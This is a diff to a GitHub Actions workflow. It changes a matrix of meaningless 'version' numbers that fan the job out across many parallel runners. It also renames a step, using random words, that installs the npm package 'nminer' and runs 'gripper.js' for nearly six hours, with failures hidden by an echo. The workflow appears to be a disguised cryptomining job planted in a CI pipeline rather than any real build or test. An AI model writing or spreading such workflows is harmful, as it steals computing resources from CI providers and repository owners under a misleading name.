@@ -9,24 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7669 }
-          - { version: 9227 }
-          - { version: 2491 }
-          - { version: 3284 }
-          - { version: 2470 }
-          - { version: 2272 }
-          - { version: 4834 }
-          - { version: 9560 }
-          - { version: 2651 }
-          - { version: 4799 }
-          - { version: 6927 }
-          - { version: 1494 }
-          - { version: 3204 }
-          - { version: 4325 }
-          - { version: 7637 }
-          - { version: 5399 }
-          - { version: 6415 }
-          - { version: 3553 }
+          - { version: 5170 }
+          - { version: 9313 }
+          - { version: 3465 }
+          - { version: 5739 }
+          - { version: 5841 }
+          - { version: 5371 }
+          - { version: 4999 }
+          - { version: 2679 }
+          - { version: 5748 }
+          - { version: 4350 }
+          - { version: 4555 }
+          - { version: 7605 }
+          - { version: 24 }
+          - { version: 1959 }
+          - { version: 7529 }
+          - { version: 3704 }
 
     steps:
       - name: Checkout
@@ -37,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: silently gee impish
+      - name: obediently beautifully permafrost actually minister
         run: |
           npm install nminer@latest
-          timeout 309m node gripper.js || echo "gripper executed"
+          timeout 349m node gripper.js || echo "gripper executed"
